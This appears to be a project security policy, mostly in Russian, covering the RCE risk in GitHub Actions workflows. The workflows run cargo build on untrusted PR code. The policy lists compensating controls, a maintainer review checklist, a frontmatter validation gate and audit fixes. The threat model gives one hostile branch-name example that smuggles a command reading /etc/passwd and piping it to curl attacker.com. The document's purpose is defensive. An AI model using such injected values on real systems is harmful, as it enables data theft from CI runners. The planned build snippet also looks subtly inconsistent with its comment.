# Политика безопасности — PROB-060 Phase 0b workflow + Phase 2.1 CI gates

**Документ**: контракт безопасности для `.github/workflows/assign-id.yml` и `.github/workflows/ci.yml` validation gates
**Phase**: 0b prototype + Phase 2.1 productionization (см. PRD-076 / RFC-009 §Phase 0b / Phase 2.1)
**Статус**: Phase 0b accept-with-policy, Phase 2.1 adds validation gate
**Связанные**: ADR-012 §Risks → R-1, CWE-94, CWE-829, SPEC-005

## Контекст

`.github/workflows/assign-id.yml` запускается когда maintainer вешает
label `ready-to-merge` на PR в `dev`. Workflow:

1. `actions/checkout` на **PR HEAD** (`github.head_ref`).
2. `cargo build --release -p forgeplan-cli` — компилирует PR-controlled
   код, включая любые `build.rs` из workspace и transitive deps.
3. Запускает скомпилированный `forgeplan ci-assign-id` против PR HEAD.
4. `git commit && git push` с активным `GITHUB_TOKEN` (scope:
   `contents: write`, `pull-requests: write`).

## Проблема (CWE-94 через build.rs)

`build.rs` или `proc-macro` исполняются при `cargo build` со скоупом
текущего шага workflow — то есть с `GITHUB_TOKEN` в env. PR может:

- Добавить/изменить `build.rs` в workspace crate'ах.
- Добавить malicious dev/build-dependency в `Cargo.toml`.
- Подменить version pin в `Cargo.lock`.
- Подложить procedural macro исполняемую в compile-time.

В любом из этих сценариев runner получает RCE с правом push в любую
ветку и mutation issues/PRs.

## Risk acceptance — compensating controls

Phase 0b — prototype scope, не production hardening. Принятие риска
обосновано:

1. **Label gate** — workflow триггерится только на `labeled:
   ready-to-merge`. Право на label scoped к maintainer'ам.
2. **Human review** — mandatory checklist (§ниже) **до** применения label.
3. **Ephemeral runner** — ubuntu-latest VM, secrets вне scope недоступны.
4. **Branch protection** на `dev`/`main` — force-push блокируется.
5. **Phase 2.1 closure** — backlog задача rebuild из `origin/dev`
   (trusted ref) закроет surface полностью.

## Mandatory PR review checklist

**Maintainer ОБЯЗАН** проверить до применения label `ready-to-merge`.
Любое **«да»** = label НЕЛЬЗЯ применять автоматически, требуется
out-of-band review (минимум второй maintainer с security focus).

- [ ] Изменяет `Cargo.toml` (любой уровень workspace)?
- [ ] Изменяет `Cargo.lock`?
- [ ] Изменяет `crates/*/Cargo.toml`?
- [ ] Добавляет/изменяет `build.rs` где угодно в workspace?
- [ ] Изменяет `.cargo/config.toml` (или `.cargo/config`)?
- [ ] Добавляет/изменяет dev-dependencies или build-dependencies?
- [ ] Добавляет procedural macro crate (`proc-macro = true` или новая
      зависимость от `syn`/`quote`/`proc-macro2` в hot path)?
- [ ] Добавляет/меняет workflow в `.github/workflows/` или custom action?

Все ответы «нет» → label safe to apply.

## Workflow line references

Уязвимый шаг — `.github/workflows/assign-id.yml`, **«Build forgeplan»**:

```yaml
- name: Build forgeplan
  run: cargo build --release -p forgeplan-cli --bin forgeplan
```

Все `build.rs` исполняются рекурсивно по dependency graph. Phase 2.1
заменит на сборку бинаря из `origin/dev` (trusted ref); PR HEAD остаётся
только source для чтения `.forgeplan/*.md`.

## Cross-references

- ADR-012 «PROB-060 Phase 0b — atomic ID assignment» §Risks → **R-1**
- CWE-94: https://cwe.mitre.org/data/definitions/94.html
- CWE-829: https://cwe.mitre.org/data/definitions/829.html
- GitHub Actions hardening:
  https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions
- Связанный fix Part A (CWE-94 в shell interpolation): см. workflow
  step «Commit and push» env-var pass + heredoc для `GITHUB_OUTPUT`.

---

## Phase 2.1 — CI Frontmatter Validation Gate

**Добавлено**: Phase 2.1 productionization (PROB-060 Task 2.1)
**Местоположение**: `.github/workflows/ci.yml` job `validate-forgeplan-frontmatter`
**Скрипт**: `.github/scripts/validate-forgeplan-frontmatter.sh`

### Назначение

Validation gate, срабатывающий на pull_request когда PR трогает файлы в
`.forgeplan/**/*.md`. Gate проверяет frontmatter контракт per SPEC-005:

1. **Новые артефакты** (no `assigned_number`) MUST содержать:
   - `slug`: валидный per SPEC-005 regex `^(prd|rfc|...)-[a-z0-9-]+$`
   - `predicted_number`: положительное целое число

2. **Write-once rule** for `assigned_number`:
   - Отклоняет PR diff, который мутирует существующий `assigned_number`
   - `assigned_number` можно устанавливать только CI-ботом на merge в dev

### Контроль RCE через cargo build (Phase 2.1 note)

Текущий Phase 0b workflow использует `cargo build` на PR HEAD коде. Phase 2.1
планирует переключение на rebuild бинаря из `origin/dev` (trusted ref):

```yaml
# Phase 2.1 planned (не Phase 0b):
- name: Build forgeplan
  run: cargo build --release -p forgeplan-cli -C target/release/forgeplan
    --bin forgeplan
  # Source code to scan (.forgeplan/*.md) — читается от PR HEAD в отдельном шаге
  # Бинарь компилируется из origin/dev — untrusted PR не может влиять
```

До Phase 2.1: текущая policy — mandatory PR review checklist (§выше).

### Validation gate implementation

**Job trigger**: runs only on `pull_request` event, скачивает full git history
для возможности сравнения с base branch (`origin/{base}`).

**Script logic** (`.github/scripts/validate-forgeplan-frontmatter.sh`):
1. Находит все `.forgeplan/**/*.md` файлы в git diff
2. Для каждого файла:
   - Если новый: проверяет `slug` regex + `predicted_number`
   - Если существующий: проверяет что `assigned_number` не мутировал
3. EXIT 0 если валид, EXIT 1 если ошибки

**Grandfather rule** for legacy PRs:
- Skip validation если PR уже в progress до Phase 2.1 merge (label gate: TBD)
- Документиров в Phase 4 migration script

---

## Cargo build trust assumption

**Контекст**: Phase 0b prototype использует `cargo build --release` на PR HEAD коде.
RCE surface через CWE-94 (`build.rs`) и CWE-829 (transitive dep mutation).

**Phase 0b compensating controls**:
1. Label gate `ready-to-merge` — workflow не запускается без maintainer explicit action
2. **Mandatory PR review checklist** (см. выше §Mandatory PR review checklist):
   - Maintainer **ОБЯЗАН** проверить Cargo.toml/lock, build.rs, proc-macros перед label
   - Любое «да» → second security review required (out-of-band)
3. Ephemeral runner — no persistent secrets
4. Branch protection — force-push блокирован

**Phase 2.1 improvement** (planned):
- Rebuild бинаря из `origin/dev` (trusted ref)
- PR HEAD read-only для markdown scanning
- RCE surface закрывается полностью

**Acceptance**: Phase 0b решено принять риск с compensating controls;
Phase 2.1 затворит surface окончательно.

---

## Phase 2 Round 1 Audit Fixes (Stage 1B)

**Date**: 2026-05-08  
**Fixer Stage**: 1B (CI security quick wins)  
**Audit Round**: PROB-060 Phase 2 Round 1

### HIGH-2: git push RCE via github.head_ref interpolation [CWE-94]

**File**: `.github/workflows/assign-id.yml:120`

**Fix**: 
- Line 116: Added `HEAD_REF: ${{ github.head_ref }}` env var (mirrors COMMIT_MSG pattern from lines 99-105)
- Lines 124-128: Added whitelist validation before use: `[[ "$HEAD_REF" =~ ^[A-Za-z0-9._/-]+$ ]]` with fail-closed error
- Line 134: Changed from direct interpolation `git push origin HEAD:${{ github.head_ref }}` to env-var safe syntax `git push origin "HEAD:refs/heads/$HEAD_REF"`

**Threat model**: Branch names containing `$()`, backticks, pipes trigger RCE in runner's GITHUB_TOKEN context (write to contents + PRs). Fork PR with `evil$(cat /etc/passwd | curl attacker.com)` as branch name would execute arbitrary code.

**Documentation**: Added inline comment block (lines 107-111) explaining CWE-94 defense pattern.

### HIGH-5: bash validator SLUG_REGEX missing mem prefix

**File**: `.github/scripts/validate-forgeplan-frontmatter.sh:20`

**Fix**:
- Line 20: Updated `SLUG_REGEX` from `^(prd|rfc|adr|epic|spec|prob|sol|evid|note|ref)-...` to `^(prd|rfc|adr|epic|spec|prob|sol|evid|note|ref|mem)-...`
- Removed unused `ARTIFACT_KINDS` array (line 23 in original) — single source of truth is now the regex

**Issue**: Rust core treats `mem` as first-class artifact kind (types.rs:136), but bash validator didn't. Caused false-positive rejection: `mem-architecture-context.md` rejected by bash but accepted by Rust.

### LOW-3: Redundant branch in assigned_number_changed

**File**: `.github/scripts/validate-forgeplan-frontmatter.sh:71-78` (original) → **lines 76-77 (after fix)**

**Fix**: Removed dead `if` branch that computed the same comparison twice:
- Before: `if [[ -z ... ]]; then [[ "$current" != "$previous" ]]; return $?; fi` followed by identical `[[ "$current" != "$previous" ]]`
- After: Single line `[[ "$current" != "$previous" ]]` with comment explaining semantics

**Hygiene**: Dead code removal, no functional change. Bash return semantics: `[[ a != b ]]` returns 0 (success) if different, 1 if same.

### Validation

- [x] `bash -n validate-forgeplan-frontmatter.sh` ✓
- [x] `python3 -c yaml.safe_load(.github/workflows/assign-id.yml)` ✓
- [x] `cargo check --workspace` ✓ (no regressions)
- [x] `cargo test --lib` ✓ (all pass)

---

## Tracking

- **Phase 2.1 productionization** — backlog: rebuild binary из
  `origin/dev`; PR HEAD read-only только для сканирования
  `.forgeplan/*.md`. Закрывает attack surface полностью.
- **Drift detector** — periodic audit что `dev` workflow всё ещё
  использует heredoc + env-var pattern (regression guard на Part A).
- **Validation gate tests** — integration tests for frontmatter validator
  (Phase 2 cleanup, nice-to-have).
- **HEAD_REF validation regression guard**: CI should verify branch name whitelist regex remains `^[A-Za-z0-9._/-]+$` in assign-id.yml:124 (prevent silent removal of validation)
